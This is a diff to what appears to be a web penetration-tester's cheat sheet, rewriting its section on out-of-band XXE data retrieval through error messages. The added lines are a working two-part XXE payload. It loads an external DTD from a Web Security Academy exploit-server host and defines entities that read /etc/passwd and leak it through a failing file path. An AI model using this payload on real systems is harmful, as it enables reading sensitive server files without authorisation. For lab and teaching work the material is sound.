@@ -693,12 +693,27 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 ## XXE OOB to retrieve data via error messages
   
-\<!ENTITY % file SYSTEM "file:///etc/passwd">
-\<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
-
 codes/xxe/error.dtd
 
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd
+-> Part 1
+
+\<!DOCTYPE foo [
+
+\<!ENTITY % xxe SYSTEM "https://exploit-0a68008104673c17c01f5f1c01020020.web-security-academy.net/evil.dtd"> 
+
+%xxe;
+
+%payload;
+
+%remote;
+
+]>
+
+-> Part 2
+
+\<!ENTITY % file SYSTEM "file:///etc/passwd">
+
+\<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
   
 ## XSLT Server Side Injection
   
